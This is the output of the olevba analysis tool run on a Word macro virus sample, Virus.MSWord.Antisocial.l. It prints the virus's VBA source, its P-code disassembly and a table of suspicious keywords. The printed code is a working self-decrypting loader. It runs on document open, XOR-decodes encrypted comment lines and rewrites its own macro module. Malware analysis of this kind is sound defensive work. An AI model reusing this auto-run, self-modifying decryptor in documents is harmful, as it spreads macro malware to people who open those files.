olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisocial.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
For V1 = 17 To 36
V2 = Null
V3 = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Asc((Mid(V3, 2, 1)))
V5 = V4 Xor 39
For V6 = 4 To Len(V3) Step 2
V7 = Asc(Mid(V3, V6, 1)) Xor V5
V2 = V2 & Chr(V7)
Next
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, V2
Next
Call Demo
End Sub
Private Sub Demo()
'"‡JòkK%c@§wWwfj5w!%õWÃ`v‡p‡hß`|%½Kt`v}UqS
'&ÐG×njs~!ý@¼!�<Ú!l0B6ê!’UÐn©!m2ö7s
'$QAÌ#ç>:#éM«væoÉoi
'"×FC%Ñ8€%™'0"-'Ú%û#%%²-ôQ;mvlŽvèAFjØf±pRh+`ëk�qµ+/S$GõUOwçjƒoF``fÇqÞ+YSnGáFßj}h¥uKjòkZ`$khq¦vu+¯LÅq¾`Jh--W4M,ù+HF²jêa]`YHÌjÉawpCiŸ`;+]Ißlµkˆ`žvT-$DY)ô%-4Þ,2,À
'$ëG,#¥>�#ãJƒmÙwØ+0Q¡m‘gÐ+€*ù#@)¶#º;Ã*�#ü(Þ#G2´
'$âEÃlxq6#ªF8#¶>e#42­#šW¡lÛ#ðOOfAm¿+Ô@h*Ý
' uA¢'s:”'ŠF£tÌdi/[JánZcD/DDV+H'•Bö+x'c6¶.T.º'i_+hòu]'¶Cþ
'#rF†$À9Y$âFÎ$ˆ"<$MGWlýv$,iB¾-`$g"B$hGŠlîv),ÊM1j¬p¹,Í,zVÉjG`ð$h.0$c6±6D6ã-E$�/î$ˆ7ü7€-Ë-¿
'%EL³gûzÌvŸ"vG^
' US¼o¨nJtõCÖh³d0rˆj6b³iÍs†)"Q–E¨Wàufh_m©brd™s®)²QBE¹DòhÌjòwBhciÂbYiôsôtÝ)éNKsîb:jÐ/Ã6ð.†)êDFh�ctb¥J(hncÂr2kUb/)ÚUMbÌwùkÒf‹d¸b^K2nliVb‚'jF¯+€'Û%ˆ „%«'¶!þ')Eš
'&¨OFdŽy„uü!¦@Ç
'$èLÝsiwáj’lOmåp�-ûU'jøqÝv`pNSƒq¹l_w÷fI`²w,jãl-mŒ#‰>9#63q
'&öNýq u"hªnÆowrž/ERµ`Ow¤dÞO›n÷ssl«`?mÄQ¿sânÖl´q]u…!¤<1!;1ó
'$ãL¡sMwájPlem+p„-j@ªlsmðeÃj/qlnv@ŸlXmðu}f`qîp½jðlŒmhpÒ#/>6#¼3Q
'$ËWQGk#^>Œ#÷W´kÙj‰pjGál¤`jv›n&fãmƒwž-DUJA¦S0qýlñiæfÞ`ówv-ÛUvA…@Ûl×n¬s|l?mµf>m!wdp£-nJ·wšf`nP+‚2�*r-û@llpgùfcN[lUg´v•oðf…-¢OgjHm4fÕpˆ+…2n/+#÷W¤k^j‰pkGÛl¾`åvOn9f‰m<wD-�UÚA¸SÌq,lTi¥fü`ÎwH-§U³Aï@‘l•nws�lÕméfªmöwApç-òJuwùfzn¹+ 2u*Ž-Æ@¶l•g!f±Næljg†véo•fˆ-J@žlUv’mÆw,Lœe„O“jYm°fjp®*Ù
'$ZM<lÔqpn¡bYoyWæfinRs3odbòw(fï-LURA©SKq¬l‘iWf:`·wB-EU&AH@Sl�n²sÃlˆmifÃmýwˆpK-ÍJIwCf«nS+Ù2Š*8-À@×logFf»N¯lçgÕvSoèfÙ-?G3f3oWfSw1f¦O�jbm§f$p…#32˜/¡#ëMŒlVqþnjb…oîW‚fËn<sToÓb2wSf,-UUxA½S¤qèlÐi¬fÄ`ùw\-eU¥Aô@òl¿nls;l‘m4f_mlwípß-PJ2wrfËnö+°2Š*\-U@ÂlÆgDf½NBl\gŒveoåf·-±@ÝljvnmàwÙL×eÜO¾j‘mvf¯p7
'%ËL/mup(o¼cŒnÀV„g{oÑrÍn csv4gž,‚Tq@®R§p–mºh/gfa¶vÃ,ÙT¯@/Aµmëo÷r®m™lÉgVl¨v�q“,qKkvcgƒoÚ*q36+²,²AÏm‚f+gƒOÐm�f‘wÜn”gá,sCCf;fÀD=pTm4o�Qqv­pÜk l÷eù"œV‚F¦
'"SDÝftq™l"sA`ÖA†jÐf‰p1hU`'k\qs+—SØG.U¼w¸jVoˆ`ÍfÚqç+…SYGmFËjßhGu}jfkF`±k!qÈv“+ÞLíq·`ôhI-]4ß,÷+ÅF.jkaU`(H6jÈa·pêi=`ë+µAÎ`Wi¬`£q/`�IÐl¢kç`Övº%¡4.);%©D˜fSqÄl³sû`vA%jÕfÍp—hY`^k6qµ+ÒS.GÈUôw‡jÐo³`JfBqÓ+«S‘GÊF‰jqhnujjÉkÈ`«kzq6vq+NL¹q{`Nh¨-ò4‰,É+õF=j�aU`GHÍjëa7p‚i²`“+×Fèj­pÆkéqªJÛc\I?lÌk-`Öv=
'&m@^b-uµhðwýd¹E¹nwbqt±lÞdøo±uó/ÂWaC3Q¾sŠnLkHdTbÎuï/aWQC3BŒnŒlfq$n]o¢dßo:u$r�/ìHÉuâdØl–)x0×(²/SB÷nke³dÖL®nVe}ttmÅdâ/ü@•eõe†GÇsónÖlÉR‰uBsohøo¯fŒ!3UÝE*
'#NE:g¤pùm-r2az@·kÒgšq=isazjõp“*¤WÔeÊr]a/E~w2$8B†mÐh a2J|e�i¨aG>Ñ9ºE¬g:pQmérÑa‰@ÖkrgèqõiVa¶jˆp'*óB)qIh½h»JÄe“i¯ag$Ù#©E‰hÄe7w�%q$WP[lAaã$ý@|aÌi$kÌjÄ$0LŸe'w‡$¶I¹e=`,aŽ$¾Mápµwn$USXeå}à$ˆM�j©p¥kÍ$`Khq„v—$iL�k`iLa0*i*Ü*©$ÈSµaá$°I³qYw‹pð$ª@=aàw)pÑvpk9}Â$¼Mþpw%ž$‚H^}gwÆ$XO-kªrEmWg—o"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Antisocial.l
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 31287 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	StartForVariable 
' 	Ld V1 
' 	EndForVariable 
' 	LitDI2 0x0011 
' 	LitDI2 0x0024 
' 	For 
' Line #3:
' 	LitVarSpecial (Null)
' 	St V2 
' Line #4:
' 	Ld V1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St V3 
' Line #5:
' 	Ld V3 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	ArgsLd Asc 0x0001 
' 	St V4 
' Line #6:
' 	Ld V4 
' 	LitDI2 0x0027 
' 	Xor 
' 	St V5 
' Line #7:
' 	StartForVariable 
' 	Ld V6 
' 	EndForVariable 
' 	LitDI2 0x0004 
' 	Ld V3 
' 	FnLen 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #8:
' 	Ld V3 
' 	Ld V6 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld V5 
' 	Xor 
' 	St V7 
' Line #9:
' 	Ld V2 
' 	Ld V7 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St V2 
' Line #10:
' 	StartForVariable 
' 	Next 
' Line #11:
' 	Ld V1 
' 	Ld V2 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #12:
' 	StartForVariable 
' 	Next 
' Line #13:
' 	ArgsCall (Call) Demo 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Private Sub Demo())
' Line #16:
' 	QuoteRem 0x0000 0x002A ""‡JòkK%c@§wWwfj5w!%õWÃ`v‡p‡hß`|%½Kt`v}UqS"
' Line #17:
' 	QuoteRem 0x0000 0x0022 "&ÐG×njs~!ý@¼!�<Ú!l0B6ê!’UÐn©!m2ö7s"
' Line #18:
' 	QuoteRem 0x0000 0x0012 "$QAÌ#ç>:#éM«væoÉoi"
' Line #19:
' 	QuoteRem 0x0000 0x009E ""×FC%Ñ8€%™'0"-'Ú%û#%%²-ôQ;mvlŽvèAFjØf±pRh+`ëk�qµ+/S$GõUOwçjƒoF``fÇqÞ+YSnGáFßj}h¥uKjòkZ`$khq¦vu+¯LÅq¾`Jh--W4M,ù+HF²jêa]`YHÌjÉawpCiŸ`;+]Ißlµkˆ`žvT-$DY)ô%-4Þ,2,À"
' Line #20:
' 	QuoteRem 0x0000 0x002E "$ëG,#¥>�#ãJƒmÙwØ+0Q¡m‘gÐ+€*ù#@)¶#º;Ã*�#ü(Þ#G2´"
' Line #21:
' 	QuoteRem 0x0000 0x0028 "$âEÃlxq6#ªF8#¶>e#42­#šW¡lÛ#ðOOfAm¿+Ô@h*Ý"
' Line #22:
' 	QuoteRem 0x0000 0x0038 " uA¢'s:”'ŠF£tÌdi/[JánZcD/DDV+H'•Bö+x'c6¶.T.º'i_+hòu]'¶Cþ"
' Line #23:
' 	QuoteRem 0x0000 0x0058 "#rF†$À9Y$âFÎ$ˆ"<$MGWlýv$,iB¾-`$g"B$hGŠlîv),ÊM1j¬p¹,Í,zVÉjG`ð$h.0$c6±6D6ã-E$�/î$ˆ7ü7€-Ë-¿"
' Line #24:
' 	QuoteRem 0x0000 0x000E "%EL³gûzÌvŸ"vG^"
' Line #25:
' 	QuoteRem 0x0000 0x009C " US¼o¨nJtõCÖh³d0rˆj6b³iÍs†)"Q–E¨Wàufh_m©brd™s®)²QBE¹DòhÌjòwBhciÂbYiôsôtÝ)éNKsîb:jÐ/Ã6ð.†)êDFh�ctb¥J(hncÂr2kUb/)ÚUMbÌwùkÒf‹d¸b^K2nliVb‚'jF¯+€'Û%ˆ „%«'¶!þ')Eš"
' Line #26:
' 	QuoteRem 0x0000 0x000E "&¨OFdŽy„uü!¦@Ç"
' Line #27:
' 	QuoteRem 0x0000 0x0038 "$èLÝsiwáj’lOmåp�-ûU'jøqÝv`pNSƒq¹l_w÷fI`²w,jãl-mŒ#‰>9#63q"
' Line #28:
' 	QuoteRem 0x0000 0x003A "&öNýq u"hªnÆowrž/ERµ`Ow¤dÞO›n÷ssl«`?mÄQ¿sânÖl´q]u…!¤<1!;1ó"
' Line #29:
' 	QuoteRem 0x0000 0x003E "$ãL¡sMwájPlem+p„-j@ªlsmðeÃj/qlnv@ŸlXmðu}f`qîp½jðlŒmhpÒ#/>6#¼3Q"
' Line #30:
' 	QuoteRem 0x0000 0x0114 "$ËWQGk#^>Œ#÷W´kÙj‰pjGál¤`jv›n&fãmƒwž-DUJA¦S0qýlñiæfÞ`ówv-ÛUvA…@Ûl×n¬s|l?mµf>m!wdp£-nJ·wšf`nP+‚2�*r-û@llpgùfcN[lUg´v•oðf…-¢OgjHm4fÕpˆ+…2n/+#÷W¤k^j‰pkGÛl¾`åvOn9f‰m<wD-�UÚA¸SÌq,lTi¥fü`ÎwH-§U³Aï@‘l•nws�lÕméfªmöwApç-òJuwùfzn¹+ 2u*Ž-Æ@¶l•g!f±Næljg†véo•fˆ-J@žlUv’mÆw,Lœe„O“jYm°fjp®*Ù"
' Line #31:
' 	QuoteRem 0x0000 0x011C "$ZM<lÔqpn¡bYoyWæfinRs3odbòw(fï-LURA©SKq¬l‘iWf:`·wB-EU&AH@Sl�n²sÃlˆmifÃmýwˆpK-ÍJIwCf«nS+Ù2Š*8-À@×logFf»N¯lçgÕvSoèfÙ-?G3f3oWfSw1f¦O�jbm§f$p…#32˜/¡#ëMŒlVqþnjb…oîW‚fËn<sToÓb2wSf,-UUxA½S¤qèlÐi¬fÄ`ùw\-eU¥Aô@òl¿nls;l‘m4f_mlwípß-PJ2wrfËnö+°2Š*\-U@ÂlÆgDf½NBl\gŒveoåf·-±@ÝljvnmàwÙL×eÜO¾j‘mvf¯p7"
' Line #32:
' 	QuoteRem 0x0000 0x0094 "%ËL/mup(o¼cŒnÀV„g{oÑrÍn csv4gž,‚Tq@®R§p–mºh/gfa¶vÃ,ÙT¯@/Aµmëo÷r®m™lÉgVl¨v�q“,qKkvcgƒoÚ*q36+²,²AÏm‚f+gƒOÐm�f‘wÜn”gá,sCCf;fÀD=pTm4o�Qqv­pÜk l÷eù"œV‚F¦"
' Line #33:
' 	QuoteRem 0x0000 0x011C ""SDÝftq™l"sA`ÖA†jÐf‰p1hU`'k\qs+—SØG.U¼w¸jVoˆ`ÍfÚqç+…SYGmFËjßhGu}jfkF`±k!qÈv“+ÞLíq·`ôhI-]4ß,÷+ÅF.jkaU`(H6jÈa·pêi=`ë+µAÎ`Wi¬`£q/`�IÐl¢kç`Övº%¡4.);%©D˜fSqÄl³sû`vA%jÕfÍp—hY`^k6qµ+ÒS.GÈUôw‡jÐo³`JfBqÓ+«S‘GÊF‰jqhnujjÉkÈ`«kzq6vq+NL¹q{`Nh¨-ò4‰,É+õF=j�aU`GHÍjëa7p‚i²`“+×Fèj­pÆkéqªJÛc\I?lÌk-`Öv="
' Line #34:
' 	QuoteRem 0x0000 0x0094 "&m@^b-uµhðwýd¹E¹nwbqt±lÞdøo±uó/ÂWaC3Q¾sŠnLkHdTbÎuï/aWQC3BŒnŒlfq$n]o¢dßo:u$r�/ìHÉuâdØl–)x0×(²/SB÷nke³dÖL®nVe}ttmÅdâ/ü@•eõe†GÇsónÖlÉR‰uBsohøo¯fŒ!3UÝE*"
' Line #35:
' 	QuoteRem 0x0000 0x0114 "#NE:g¤pùm-r2az@·kÒgšq=isazjõp“*¤WÔeÊr]a/E~w2$8B†mÐh a2J|e�i¨aG>Ñ9ºE¬g:pQmérÑa‰@ÖkrgèqõiVa¶jˆp'*óB)qIh½h»JÄe“i¯ag$Ù#©E‰hÄe7w�%q$WP[lAaã$ý@|aÌi$kÌjÄ$0LŸe'w‡$¶I¹e=`,aŽ$¾Mápµwn$USXeå}à$ˆM�j©p¥kÍ$`Khq„v—$iL�k`iLa0*i*Ü*©$ÈSµaá$°I³qYw‹pð$ª@=aàw)pÑvpk9}Â$¼Mþpw%ž$‚H^}gwÆ$XO-kªrEmWg—o""
' Line #36:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

